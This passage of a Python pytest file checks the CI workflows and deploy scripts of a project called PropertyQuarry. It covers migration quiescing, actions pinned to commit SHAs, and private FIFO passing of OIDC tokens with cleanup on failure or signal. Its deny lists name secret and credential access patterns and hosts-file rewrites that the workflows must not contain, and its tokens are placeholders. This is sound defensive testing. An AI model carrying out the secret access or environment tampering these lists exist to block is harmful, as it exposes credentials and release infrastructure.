)

event() {
  printf '%s\n' "$*" >> "${EVENT_LOG}"
}

container_state_line() {
  local service="${1#cid-}"
  local state="${SERVICE_STATE[${service}]:-missing}"
  case "${state}" in
    running) printf 'running|healthy' ;;
    restarting) printf 'restarting|starting' ;;
    paused) printf 'paused|healthy' ;;
    created) printf 'created|none' ;;
    removing) printf 'removing|none' ;;
    stopped) printf 'exited|none' ;;
    dead) printf 'dead|none' ;;
  esac
}

fake_compose() {
  local action="$1"
  local skip_next=0
  local arg=""
  local service=""
  shift
  if [[ "${action}" == "ps" ]]; then
    for arg in "$@"; do
      service="${arg}"
    done
    if [[ "${SERVICE_STATE[${service}]:-missing}" != "missing" ]]; then
      printf 'cid-%s' "${service}"
    fi
    return 0
  fi
  event "compose ${action} $*"
  if [[ "${SCENARIO}" == "quiesce-failure" && "${action}" == "stop" ]]; then
    SERVICE_STATE[api]="stopped"
    return 1
  fi
  if [[ "${SCENARIO}" == "paused-writer-stuck" && "${action}" == "stop" ]]; then
    SERVICE_STATE[scheduler]="stopped"
    return 0
  fi
  case "${action}" in
    stop)
      for arg in "$@"; do
        if [[ "${skip_next}" == "1" ]]; then
          skip_next=0
          continue
        fi
        if [[ "${arg}" == "--timeout" ]]; then
          skip_next=1
          continue
        fi
        SERVICE_STATE["${arg}"]="stopped"
      done
      ;;
    start)
      for arg in "$@"; do
        SERVICE_STATE["${arg}"]="running"
      done
      ;;
    *)
      return 2
      ;;
  esac
}

DC=(fake_compose)
source "${QUIESCE_HELPER}"
PROPERTYQUARRY_ALLOWED_DATABASE_WRITER_CONTAINER_NAMES=(api worker scheduler)
database_writer_inventory_lines() {
  if [[ "${SERVICE_STATE[api]}" != "stopped" ]]; then printf 'cid-api|api\n'; fi
  if [[ "${SERVICE_STATE[worker]}" != "stopped" ]]; then printf 'cid-worker|worker\n'; fi
  if [[ "${SERVICE_STATE[scheduler]}" != "stopped" ]]; then printf 'cid-scheduler|scheduler\n'; fi
}
database_writer_session_inventory_lines() { return 0; }
stop_database_writer_container() { return 0; }
database_writer_container_is_active() { return 1; }
propertyquarry_install_schema_quiesce_traps
propertyquarry_quiesce_schema_writers \
  api api worker worker scheduler scheduler render render migrate migrate 30 2

case "${SCENARIO}" in
  success)
    event migration-completed
    propertyquarry_mark_schema_migration_committed
    SERVICE_STATE[api]="running"
    event candidate-api-ready
    SERVICE_STATE[worker]="running"
    event candidate-worker-ready
    SERVICE_STATE[scheduler]="running"
    event candidate-scheduler-ready
    propertyquarry_finish_schema_quiesce
    ;;
  precommit-failure)
    SERVICE_STATE[migrate]="running"
    event migration-failed
    false
    ;;
  paused-migrator-failure)
    SERVICE_STATE[migrate]="paused"
    event migration-failed
    false
    ;;
  postcommit-failure)
    event migration-completed
    propertyquarry_mark_schema_migration_committed
    SERVICE_STATE[api]="running"
    event candidate-api-started
    false
    ;;
  *)
    exit 64
    ;;
esac
'''
    env = {
        **os.environ,
        "QUIESCE_HELPER": str(ROOT / "scripts/propertyquarry_deploy_quiesce.sh"),
        "EVENT_LOG": str(event_log),
        "SCENARIO": scenario,
        "INITIAL_API_STATE": api_state,
        "INITIAL_WORKER_STATE": worker_state,
        "INITIAL_SCHEDULER_STATE": scheduler_state,
    }
    completed = subprocess.run(
        ["bash", "-c", shell],
        cwd=ROOT,
        env=env,
        text=True,
        capture_output=True,
        check=False,
    )
    events = event_log.read_text(encoding="utf-8").splitlines() if event_log.exists() else []
    return completed, events


def test_make_deploy_uses_hardened_propertyquarry_wrapper() -> None:
    makefile = _read("Makefile")

    assert "./scripts/deploy_propertyquarry.sh" in makefile
    assert "PROPERTYQUARRY_COMPOSE_FILE" not in makefile.split("\ndeploy:\n", 1)[1].split(
        "\n\ndeploy-legacy-ea-stack:", 1
    )[0]
    assert "PROPERTYQUARRY_USE_LEGACY_STACK=1 bash scripts/deploy.sh" in makefile
    assert "docker compose -f docker-compose.property.yml up -d --build --remove-orphans" not in makefile


def test_smoke_runtime_runs_unprivileged_local_propertyquarry_browser_contracts() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    browser_test = _read("tests/e2e/test_propertyquarry_greenfield_browser.py")
    browser_job = _workflow_job(workflow, "propertyquarry-browser-contracts")
    product_browser_job = _workflow_job(workflow, "product-browser-e2e")

    assert workflow.count("\n  product-browser-e2e:\n") == 1
    assert "\n  push:\n" in workflow
    assert "\n  pull_request:\n" in workflow
    assert "\n  workflow_dispatch:\n" in workflow
    assert "permissions:\n      contents: read" in browser_job
    assert "persist-credentials: false" in browser_job
    assert "python -m playwright install --with-deps chromium" in browser_job
    assert re.findall(r"tests/e2e/test_propertyquarry_[a-z0-9_]+\.py", browser_job) == [
        "tests/e2e/test_propertyquarry_greenfield_browser.py",
        "tests/e2e/test_propertyquarry_public_tour_browser.py",
    ]
    assert "python -m pytest -q" in browser_job
    assert "make property-release-gates" not in browser_job
    assert "secrets." not in browser_job
    assert "vars." not in browser_job
    assert "\n    environment:" not in browser_job
    assert "\n    if:" not in browser_job
    assert "permissions:\n      contents: read" in product_browser_job
    assert "runs-on: ubuntu-latest" in product_browser_job
    assert "fail-fast: false" in product_browser_job
    assert "browser-engine: [chromium, firefox, webkit]" in product_browser_job
    assert "persist-credentials: false" in product_browser_job
    assert 'python -m playwright install --with-deps "${{ matrix.browser-engine }}"' in product_browser_job
    assert "PROPERTYQUARRY_CORE_BROWSER_ENGINE: ${{ matrix.browser-engine }}" in product_browser_job
    assert "PYTHONPATH=ea EA_STORAGE_BACKEND=memory python -m pytest -q" in product_browser_job
    assert (
        "tests/e2e/test_propertyquarry_greenfield_browser.py::"
        "test_propertyquarry_workbench_candidate_history_stays_in_place"
        in product_browser_job
    )
    assert (
        "tests/e2e/test_propertyquarry_greenfield_browser.py::"
        "test_propertyquarry_flagship_operating_loop_in_browser"
        in product_browser_job
    )
    assert browser_test.count('browser_base_url = f"http://propertyquarry.localhost:{port}"') == 1
    assert 'monkeypatch.setenv("EA_PUBLIC_APP_BASE_URL", browser_base_url)' in browser_test
    assert 'browser_base_url = f"http://propertyquarry.com:{port}"' not in browser_test
    assert 'browser_base_url = f"http://127.0.0.1:{port}"' not in browser_test
    assert "/etc/hosts" not in product_browser_job
    assert 'echo "127.0.0.1 propertyquarry.com"' not in product_browser_job
    assert "--host-resolver-rules" not in browser_test
    assert "network.dns.localDomains" not in browser_test
    assert "secrets." not in product_browser_job
    assert "vars." not in product_browser_job
    assert "\n    environment:" not in product_browser_job
    assert "\n    if:" not in product_browser_job
    assert "propertyquarry-live-release-gates" not in product_browser_job


def test_smoke_runtime_runs_fail_closed_postgres_production_storage_browser_lane() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    job = _workflow_job(workflow, "propertyquarry-postgres-browser-e2e")
    browser_test = _read("tests/e2e/test_propertyquarry_postgres_browser.py")
    bootstrap = _read("scripts/propertyquarry_postgres_browser_bootstrap.py")

    assert workflow.count("\n  propertyquarry-postgres-browser-e2e:\n") == 1
    assert "permissions:\n      contents: read" in job
    assert "runs-on: ubuntu-latest" in job
    assert "timeout-minutes: 45" in job
    assert "persist-credentials: false" in job
    assert "continue-on-error:" not in job
    assert "|| true" not in job
    assert "secrets." not in job
    assert "vars." not in job

    for required in (
        "set -euo pipefail",
        'python -m venv "${venv}"',
        "pip install --user --ignore-installed",
        "pip install --ignore-installed",
        "-c ea/requirements.lock",
        "-c ea/requirements.ci.lock",
        "pytest==9.0.3",
        "-m playwright install --with-deps chromium",
        'docker pull "${postgres_image}"',
        'sudo systemctl start "user@${runner_uid}.service"',
        'test -S "${user_runtime_dir}/bus"',
        "DBUS_SESSION_BUS_ADDRESS",
        "/usr/bin/systemd-run",
        "--property=MemoryMax=1073741824",
        "--property=MemorySwapMax=0",
        "--property=TasksMax=128",
        "--property=CPUQuota=100%",
        "--property=RuntimeMaxSec=1200s",
        "scripts/smoke_property_postgres_isolated.py",
        '--venv "${PROPERTYQUARRY_POSTGRES_BROWSER_VENV}"',
        '--chromium-headless-shell "${PROPERTYQUARRY_POSTGRES_BROWSER_CHROMIUM}"',
        "--docker-binary /usr/bin/docker",
        "--systemd-run /usr/bin/systemd-run",
    ):
        assert required in job
    for forbidden in (
        "scripts/smoke_property_postgres.sh",
        "docker-compose.property.yml",
        "POSTGRES_PASSWORD",
        "EA_API_TOKEN",
        "--system-site-packages",
        "pytest==9.0.2",
    ):
        assert forbidden not in job

    for required in (
        "PROPERTYQUARRY_POSTGRES_BROWSER_BASE_URL",
        "PROPERTYQUARRY_POSTGRES_BROWSER_EXPECTED_READY_REASON",
        "PROPERTYQUARRY_POSTGRES_BROWSER_SESSION_FILE",
        'session_receipt.get("provisioning_scope") == "internal_ci_only"',
        'client.get("/health/ready")',
        'ready.get("reason") == expected_ready_reason',
        'version.get("storage_backend") == "postgres"',
        'registration.status_code == 503',
        '"verification_token" not in registration.text',
        'client.get("/app/properties")',
        '"X-EA-API-Token": api_token',
        '"ea_workspace_session": access_token',
        '"/v1/onboarding/property-search/preferences"',
        'authenticated_page.goto(f"{base_url}/app/search"',
        'authenticated_page.goto(f"{base_url}/app/properties"',
        'authenticated_page.locator("[data-property-decision-workbench]")',
    ):
        assert required in browser_test
    assert "TestClient" not in browser_test
    assert "create_app" not in browser_test
    assert 'client.post("/v1/register/verify"' not in browser_test

    for required in (
        "PROPERTYQUARRY_POSTGRES_BROWSER_E2E",
        'runtime_mode != "prod" or storage_backend != "postgres"',
        "container.onboarding.start_workspace",
        "issue_workspace_access_session",
        'source_kind="postgres_browser_internal_ci_bootstrap"',
        '"provisioning_scope": "internal_ci_only"',
        "_secure_write",
        "os.O_EXCL",
        'getattr(os, "O_NOFOLLOW", 0)',
    ):
        assert required in bootstrap


def test_smoke_runtime_bootstraps_clean_runner_dependencies_and_release_parent() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    security_job = _workflow_job(workflow, "security-static")
    api_job = _workflow_job(workflow, "smoke-runtime-api")
    browser_job = _workflow_job(workflow, "propertyquarry-browser-contracts")
    postgres_smoke_job = _workflow_job(workflow, "smoke-runtime-postgres")
    postgres_contract_job = _workflow_job(workflow, "postgres-runtime-contracts")

    assert "fetch-depth: 0" in security_job
    assert "Release hygiene audits every commit between the manifest candidate and HEAD." in security_job
    assert "pytest==9.0.3" in api_job
    assert "httpx==0.28.1" in api_job
    assert "jsonschema==4.25.1" in api_job
    assert "opencv-python-headless==4.13.0.92" in api_job
    assert "sudo apt-get install --yes ffmpeg" in api_job
    assert "python -m playwright install --with-deps chromium" in api_job
    assert "pytest==9.0.3" in browser_job
    assert "httpx==0.28.1" in browser_job
    assert "sudo apt-get install --yes ffmpeg" in browser_job
    assert "POSTGRES_PASSWORD: propertyquarry-ci-${{ github.run_id }}" in postgres_smoke_job
    assert "docker volume create property_propertyquarry_public_tours" in postgres_smoke_job
    assert "POSTGRES_PASSWORD: propertyquarry-ci-${{ github.run_id }}" in postgres_contract_job
    assert "pytest==9.0.3" in postgres_contract_job
    assert "httpx==0.28.1" in postgres_contract_job


def test_smoke_runtime_pins_external_actions_to_immutable_commits() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    action_uses_lines = [
        line.strip()
        for line in workflow.splitlines()
        if re.match(r"^\s*(?:-\s+)?uses:\s+", line)
    ]

    assert action_uses_lines

    def assert_immutable_action(declaration: str) -> None:
        action_declaration, _, version_comment = declaration.partition("#")
        action_ref = action_declaration.split("uses:", 1)[1].strip().strip("'\"")
        if action_ref.startswith("./"):
            return

        assert re.fullmatch(
            r"[A-Za-z0-9_.-]+(?:/[A-Za-z0-9_.-]+)+@[0-9a-f]{40}",
            action_ref,
        ), f"external action must use an immutable 40-hex commit SHA: {action_ref}"
        assert re.fullmatch(
            r"v[1-9][0-9]*",
            version_comment.strip(),
        ), f"pinned external action must retain its major version comment: {declaration}"

    for action_uses_line in action_uses_lines:
        assert_immutable_action(action_uses_line)

    assert_immutable_action("uses: ./.github/actions/local-contract")


def test_legacy_compose_forwards_postgres_password_into_database_container() -> None:
    compose = _read("docker-compose.yml")

    assert 'POSTGRES_PASSWORD: "${POSTGRES_PASSWORD:-}"' in compose


def test_smoke_runtime_uses_only_the_fixed_v2_supervisor_for_release() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    _assert_exact_v2_release_job(workflow)
    release_job = _workflow_job(workflow, "propertyquarry-release-v2")
    legacy_live_job = _workflow_job(workflow, "propertyquarry-live-release-gates")

    assert workflow.count("\n  propertyquarry-release-v2:\n") == 1
    assert f"if: {RELEASE_JOB_CONDITION}" in release_job
    assert "timeout-minutes: 360" in release_job
    assert "group: propertyquarry-release-lifecycle-v2" in release_job
    assert "cancel-in-progress: false" in release_job
    assert "environment:\n      name: propertyquarry-production" in release_job
    assert "permissions:\n      contents: none\n      id-token: write" in release_job
    assert "runs-on:" in release_job
    assert "      - propertyquarry-release-controller-v2" in release_job
    assert (
        "      - ${{ needs['propertyquarry-protected-dispatch-inputs'].outputs."
        "release_runner_label }}" in release_job
    )
    assert (
        "shell: /bin/bash --noprofile --norc -p -euo pipefail {0}"
        in release_job
    )
    assert release_job.count(RELEASE_CLIENT) == 3
    assert release_job.count("/usr/bin/env -i") == 3
    assert release_job.count("PATH=/usr/sbin:/usr/bin:/sbin:/bin") == 3
    assert release_job.count("HOME=/nonexistent") == 3
    assert release_job.count("LANG=C") == 3
    assert release_job.count("LC_ALL=C") == 3
    assert release_job.count("      - name:") == 3
    assert (
        release_job.index("release-preflight")
        < release_job.index("release-run")
        < release_job.index("ai-panorama-install")
    )
    assert release_job.count("ACTIONS_ID_TOKEN_REQUEST_URL") == 6
    assert "exec 9<<<" not in release_job
    assert release_job.count('/usr/bin/mkfifo -m 0600 -- "${oidc_fifo}"') == 3
    assert release_job.count('exec 9<"${oidc_fifo}"') == 3
    assert release_job.count(
        "builtin printf '%s\\n' "
        '"${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" >"${oidc_fifo}"'
    ) == 3
    assert release_job.count("unset ACTIONS_ID_TOKEN_REQUEST_TOKEN") == 3
    assert release_job.count("PROPERTYQUARRY_OIDC_TOKEN_FD=9") == 3
    assert release_job.count('>"${receipt}"') == 3
    assert release_job.count(
        '[[ "$(/usr/bin/stat -Lc \'%a:%h\' -- "${receipt}")" == "600:1" ]]'
    ) == 3
    assert release_job.count(
        '[[ "$(/usr/bin/wc -l <"${receipt}")" == "1" ]]'
    ) == 3
    assert (
        'ACTIONS_ID_TOKEN_REQUEST_TOKEN="${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"'
        not in release_job
    )
    for identity in (
        "GITHUB_REPOSITORY",
        "GITHUB_REF",
        "GITHUB_SHA",
        "GITHUB_WORKFLOW_REF",
        "GITHUB_WORKFLOW_SHA",
        "GITHUB_JOB",
    ):
        assert release_job.count(identity) == 6
    for run_identity in ("GITHUB_RUN_ID", "GITHUB_RUN_ATTEMPT"):
        assert release_job.count(run_identity) == 15
    for forbidden in (
        "uses:",
        "actions/",
        "secrets.",
        "vars.",
        "checkout",
        "setup-python",
        "setup-node",
        "download-artifact",
        "upload-artifact",
        "cache",
        "pip install",
        "npm install",
        "python ",
        "bash scripts/",
        "docker",
        "DATABASE_URL",
        "TEABLE_",
        "RYBBIT_",
        "TELEGRAM_",
        "PROPERTYQUARRY_RELEASE_CONTROLLER_BUNDLE_PATH",
        "GITHUB_WORKSPACE",
        "GITHUB_TOKEN",
        "_completion/",
        "continue-on-error:",
        "if: ${{ always() }}",
        "|| true",
    ):
        assert forbidden not in release_job
    assert "if: ${{ false }}" in legacy_live_job


def test_governed_tour_install_follows_managed_compose_volume_genesis() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    release_job = _assert_exact_v2_release_job(workflow)
    steps = release_job["steps"]
    assert type(steps) is list
    assert [
        str(step["run"]).rsplit("client ", 1)[1].split(" ", 1)[0]
        for step in steps
    ] == list(RELEASE_OPERATIONS)

    compose = _strict_workflow_document(_read("docker-compose.property.yml"))
    volumes = compose.get("volumes")
    services = compose.get("services")
    assert type(volumes) is dict
    assert type(services) is dict
    governed_volume = volumes.get("propertyquarry_governed_public_tours")
    assert governed_volume == {
        "name": "property_propertyquarry_governed_public_tours"
    }
    assert "external" not in governed_volume
    assert "labels" not in governed_volume

    governed_mount = (
        "propertyquarry_governed_public_tours:"
        "/data/governed_public_property_tours:ro"
    )
    governed_consumers = {}
    for service_name, service in services.items():
        assert type(service_name) is str
        assert type(service) is dict
        service_volumes = service.get("volumes", [])
        assert type(service_volumes) is list
        matches = [
            mount
            for mount in service_volumes
            if "propertyquarry_governed_public_tours" in str(mount)
        ]
        if matches:
            governed_consumers[service_name] = matches
    assert governed_consumers == {
        "propertyquarry-api": [governed_mount],
        "propertyquarry-scheduler": [governed_mount],
        "propertyquarry-render-tools": [governed_mount],
    }


@pytest.mark.parametrize("step_index", range(len(RELEASE_OPERATIONS)))
@pytest.mark.parametrize(
    "required_line",
    (
        'exec 9<"${oidc_fifo}"\n',
        "unset ACTIONS_ID_TOKEN_REQUEST_TOKEN\n",
        (
            "  PROPERTYQUARRY_RELEASE_RUNNER_LABEL="
            '"${PROPERTYQUARRY_RELEASE_RUNNER_LABEL}" \\\n'
        ),
        (
            "  PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256="
            '"${PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256}" \\\n'
        ),
        (
            "  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256="
            '"${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256}" \\\n'
        ),
        (
            "  PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID="
            '"${PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID}" \\\n'
        ),
        (
            "  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST="
            '"${PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST}" \\\n'
        ),
    ),
)
def test_every_release_operation_requires_fifo_and_five_authenticated_bindings(
    step_index: int,
    required_line: str,
) -> None:
    document = _strict_workflow_document(_read(".github/workflows/smoke-runtime.yml"))
    jobs = document["jobs"]
    assert type(jobs) is dict
    release_job = jobs["propertyquarry-release-v2"]
    assert type(release_job) is dict
    steps = release_job["steps"]
    assert type(steps) is list
    step = steps[step_index]
    assert type(step) is dict
    run = step["run"]
    assert type(run) is str
    assert required_line in run
    step["run"] = run.replace(required_line, "", 1)
    with pytest.raises(AssertionError):
        _assert_exact_v2_release_job(yaml.safe_dump(document, sort_keys=False))


def _release_step_test_environment(runner_temp: Path, *, run_attempt: str) -> dict[str, str]:
    return {
        "BASH_ENV": "/dev/null",
        "ENV": "/dev/null",
        "LD_PRELOAD": "",
        "LD_LIBRARY_PATH": "",
        "LD_AUDIT": "",
        "GCONV_PATH": "",
        "RUNNER_TEMP": str(runner_temp),
        "ACTIONS_ID_TOKEN_REQUEST_TOKEN": "private-test-oidc-bearer",
        "ACTIONS_ID_TOKEN_REQUEST_URL": "https://actions.invalid/oidc",
        "GITHUB_REPOSITORY": "ArchonMegalon/propertyquarry",
        "GITHUB_REF": "refs/heads/main",
        "GITHUB_SHA": "a" * 40,
        "GITHUB_WORKFLOW_REF": (
            "ArchonMegalon/propertyquarry/.github/workflows/"
            "smoke-runtime.yml@refs/heads/main"
        ),
        "GITHUB_WORKFLOW_SHA": "b" * 40,
        "GITHUB_RUN_ID": "123456789",
        "GITHUB_RUN_ATTEMPT": run_attempt,
        "GITHUB_JOB": "propertyquarry-release-v2",
        "PROPERTYQUARRY_RELEASE_RUNNER_LABEL": "pqrelease-" + ("c" * 32),
        "PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256": "sha256:" + ("d" * 64),
        "PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256": "e" * 64,
        "PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID": "987654321",
        "PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST": "sha256:" + ("f" * 64),
    }


def _write_fake_release_client(
    client: Path,
    event_log: Path,
    *,
    exit_code: int,
    newline_terminated: bool = True,
) -> None:
    output_command = (
        "builtin printf '%s\\n' '{\"signed_wrapper\":\"private-test-value\"}'"
        if newline_terminated
        else "builtin printf '%s' '{\"signed_wrapper\":\"private-test-value\"}'"
    )
    client.write_text(
        "#!/bin/bash\n"
        "set -euo pipefail\n"
        '[[ "$#" -eq 2 && "$1" == "client" ]]\n'
        '[[ "${PROPERTYQUARRY_OIDC_TOKEN_FD}" == "9" ]]\n'
        '[[ -p "/proc/self/fd/9" ]]\n'
        '[[ "$(/usr/bin/stat -Lc \'%a\' -- /proc/self/fd/9)" == "600" ]]\n'
        "IFS= read -r oidc_bearer <&9\n"
        '[[ "${oidc_bearer}" == "private-test-oidc-bearer" ]]\n'
        '[[ -z "${ACTIONS_ID_TOKEN_REQUEST_TOKEN+x}" ]]\n'
        "for required_name in \\\n"
        "  PROPERTYQUARRY_RELEASE_RUNNER_LABEL \\\n"
        "  PROPERTYQUARRY_RELEASE_RUNNER_TICKET_SHA256 \\\n"
        "  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ATTESTATION_SHA256 \\\n"
        "  PROPERTYQUARRY_SECURITY_BOOTSTRAP_RUN_ID \\\n"
        "  PROPERTYQUARRY_SECURITY_BOOTSTRAP_ARTIFACT_DIGEST; do\n"
        '  [[ -n "${!required_name:-}" ]]\n'
        "done\n"
        f"builtin printf '%s\\n' \"$2\" >>{shlex.quote(str(event_log))}\n"
        f"{output_command}\n"
        f"exit {exit_code}\n",
        encoding="utf-8",
    )
    client.chmod(0o700)


def test_release_client_fifo_transport_is_private_fresh_and_cleaned(
    tmp_path: Path,
) -> None:
    document = _strict_workflow_document(_read(".github/workflows/smoke-runtime.yml"))
    jobs = document["jobs"]
    assert type(jobs) is dict
    release_job = jobs["propertyquarry-release-v2"]
    assert type(release_job) is dict
    steps = release_job["steps"]
    assert type(steps) is list
    runner_temp = tmp_path / "runner-temp"
    runner_temp.mkdir(mode=0o700)
    event_log = tmp_path / "events"
    fake_client = tmp_path / "fixed-release-client"
    _write_fake_release_client(fake_client, event_log, exit_code=0)
    environment = _release_step_test_environment(runner_temp, run_attempt="1")

    for index, (step, operation) in enumerate(
        zip(steps, RELEASE_OPERATIONS, strict=True)
    ):
        assert type(step) is dict
        run = step["run"]
        assert type(run) is str
        executable_run = run.replace(RELEASE_CLIENT, shlex.quote(str(fake_client)))
        assert executable_run != run
        script = tmp_path / f"release-step-{index}.sh"
        script.write_text(executable_run, encoding="utf-8")
        result = subprocess.run(
            [
                "/bin/bash",
                "--noprofile",
                "--norc",
                "-p",
                "-euo",
                "pipefail",
                str(script),
            ],
            check=False,
            capture_output=True,
            text=True,
            env=environment,
            timeout=10,
        )
        assert result.returncode == 0, result.stderr
        assert result.stdout == ""
        assert "private-test-oidc-bearer" not in result.stderr
        assert "private-test-value" not in result.stderr
        assert list(runner_temp.iterdir()) == []
        assert event_log.read_text(encoding="utf-8").splitlines()[-1] == operation

    assert event_log.read_text(encoding="utf-8").splitlines() == list(
        RELEASE_OPERATIONS
    )


@pytest.mark.parametrize(
    ("exit_code", "newline_terminated"),
    ((42, True), (0, False)),
)
def test_release_client_failure_or_noncanonical_receipt_cleans_private_state(
    tmp_path: Path,
    exit_code: int,
    newline_terminated: bool,
) -> None:
    document = _strict_workflow_document(_read(".github/workflows/smoke-runtime.yml"))
    jobs = document["jobs"]
    assert type(jobs) is dict
    release_job = jobs["propertyquarry-release-v2"]
    assert type(release_job) is dict
    steps = release_job["steps"]
    assert type(steps) is list
    step = steps[-1]
    assert type(step) is dict
    run = step["run"]
    assert type(run) is str
    runner_temp = tmp_path / "runner-temp"
    runner_temp.mkdir(mode=0o700)
    event_log = tmp_path / "events"
    fake_client = tmp_path / "fixed-release-client"
    _write_fake_release_client(
        fake_client,
        event_log,
        exit_code=exit_code,
        newline_terminated=newline_terminated,
    )
    script = tmp_path / "release-step.sh"
    script.write_text(
        run.replace(RELEASE_CLIENT, shlex.quote(str(fake_client))),
        encoding="utf-8",
    )
    result = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-p",
            "-euo",
            "pipefail",
            str(script),
        ],
        check=False,
        capture_output=True,
        text=True,
        env=_release_step_test_environment(runner_temp, run_attempt="2"),
        timeout=10,
    )
    assert result.returncode != 0
    assert result.stdout == ""
    assert "private-test-oidc-bearer" not in result.stderr
    assert "private-test-value" not in result.stderr
    assert list(runner_temp.iterdir()) == []


def test_release_client_signal_cleanup_reaps_blocked_fifo_writer(
    tmp_path: Path,
) -> None:
    document = _strict_workflow_document(_read(".github/workflows/smoke-runtime.yml"))
    jobs = document["jobs"]
    assert type(jobs) is dict
    release_job = jobs["propertyquarry-release-v2"]
    assert type(release_job) is dict
    steps = release_job["steps"]
    assert type(steps) is list
    step = steps[-1]
    assert type(step) is dict
    run = step["run"]
    assert type(run) is str
    interrupted_run = run.replace(
        'exec 9<"${oidc_fifo}"\n',
        'builtin kill -TERM "${BASHPID}"\nexec 9<"${oidc_fifo}"\n',
        1,
    )
    assert interrupted_run != run
    runner_temp = tmp_path / "runner-temp"
    runner_temp.mkdir(mode=0o700)
    script = tmp_path / "release-step.sh"
    script.write_text(interrupted_run, encoding="utf-8")
    result = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-p",
            "-euo",
            "pipefail",
            str(script),
        ],
        check=False,
        capture_output=True,
        text=True,
        env=_release_step_test_environment(runner_temp, run_attempt="3"),
        timeout=10,
    )
    assert result.returncode == 143
    assert result.stdout == ""
    assert "private-test-oidc-bearer" not in result.stderr
    assert list(runner_temp.iterdir()) == []


def test_release_client_signal_before_writer_pid_assignment_reaps_pending_writer(
    tmp_path: Path,
) -> None:
    document = _strict_workflow_document(_read(".github/workflows/smoke-runtime.yml"))
    jobs = document["jobs"]
    assert type(jobs) is dict
    release_job = jobs["propertyquarry-release-v2"]
    assert type(release_job) is dict
    steps = release_job["steps"]
    assert type(steps) is list
    step = steps[-1]
    assert type(step) is dict
    run = step["run"]
    assert type(run) is str
    writer_pid_receipt = tmp_path / "writer.pid"
    interrupted_run = run.replace(
        "oidc_writer=$!\n",
        (
            "builtin printf '%s\\n' \"$!\" >"
            f"{shlex.quote(str(writer_pid_receipt))}\n"
            'builtin kill -TERM "${BASHPID}"\n'
            "oidc_writer=$!\n"
        ),
        1,
    )
    assert interrupted_run != run
    runner_temp = tmp_path / "runner-temp"
    runner_temp.mkdir(mode=0o700)
    script = tmp_path / "release-step-before-pid-assignment.sh"
    script.write_text(interrupted_run, encoding="utf-8")
    result = subprocess.run(
        [
            "/bin/bash",
            "--noprofile",
            "--norc",
            "-p",
            "-euo",
            "pipefail",
            str(script),
        ],
        check=False,
        capture_output=True,
        text=True,
        env=_release_step_test_environment(runner_temp, run_attempt="4"),
        timeout=10,
    )
    assert result.returncode == 143
    assert result.stdout == ""
    assert "private-test-oidc-bearer" not in result.stderr
    assert list(runner_temp.iterdir()) == []
    writer_pid = int(writer_pid_receipt.read_text(encoding="utf-8").strip())
    try:
        os.kill(writer_pid, 0)
    except ProcessLookupError:
        writer_alive = False
    else:
        writer_alive = True
        os.kill(writer_pid, signal.SIGKILL)
    assert writer_alive is False


def test_smoke_runtime_binds_flagship_security_to_one_time_protected_runner() -> None:
    workflow = _read(".github/workflows/smoke-runtime.yml")
    document = _strict_workflow_document(workflow)
    jobs = document["jobs"]
    security_job = jobs["propertyquarry-flagship-security"]
    release_job = jobs["propertyquarry-release-v2"]
    security_job_text = _workflow_job(workflow, "propertyquarry-flagship-security")

    assert type(security_job) is dict
    assert security_job["if"] == (
        "${{ github.event_name == 'workflow_dispatch' "
        "&& github.repository == 'ArchonMegalon/propertyquarry' "
        "&& github.ref == 'refs/heads/main' "
        "&& startsWith(inputs.security_runner_label, 'pqsec-') "
        "&& needs['propertyquarry-protected-dispatch-inputs'].result == 'success' "
        "&& needs['propertyquarry-protected-dispatch-inputs'].outputs.security_runner_label "
        "== inputs.security_runner_label }}"
    )
    assert security_job["needs"] == "propertyquarry-protected-dispatch-inputs"
    assert security_job["environment"] == {"name": "propertyquarry-production"}
    assert security_job["permissions"] == {"contents": "read"}
    assert security_job["runs-on"] == [
        "self-hosted",
        "propertyquarry-security",
        "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs.security_runner_label }}",
    ]
    assert security_job["env"] == {
        "PROPERTYQUARRY_WORKFLOW_HEAD_SHA": "${{ github.sha }}",
        "PROPERTYQUARRY_SECURITY_RUNNER_LABEL": (
            "${{ needs['propertyquarry-protected-dispatch-inputs'].outputs.security_runner_label }}"
        ),
        "PROPERTYQUARRY_WEB_IMAGE": "${{ vars.PROPERTYQUARRY_WEB_IMAGE }}",
        "PROPERTYQUARRY_RENDER_IMAGE": "${{ vars.PROPERTYQUARRY_RENDER_IMAGE }}",
    }
    assert "security_runner_label:" in workflow.split("jobs:", 1)[0]
    assert "required: true" in workflow.split("security_runner_label:", 1)[1].split(
        "run_activation_journey:", 1
    )[0]
    assert "persist-credentials: false" in security_job_text
    dispatch_input_job = jobs["propertyquarry-protected-dispatch-inputs"]
    assert type(dispatch_input_job) is dict
    assert dispatch_input_job["permissions"] == {"contents": "none"}
    assert dispatch_input_job["runs-on"] == "ubuntu-latest"
    assert dispatch_input_job["outputs"] == {
        "release_runner_label": "${{ steps.validate.outputs.release_runner_label }}",
        "release_runner_ticket_sha256": (
            "${{ steps.validate.outputs.release_runner_ticket_sha256 }}"
        ),
        "security_runner_label": "${{ steps.validate.outputs.security_runner_label }}",
        "security_runner_token_expires_at": (
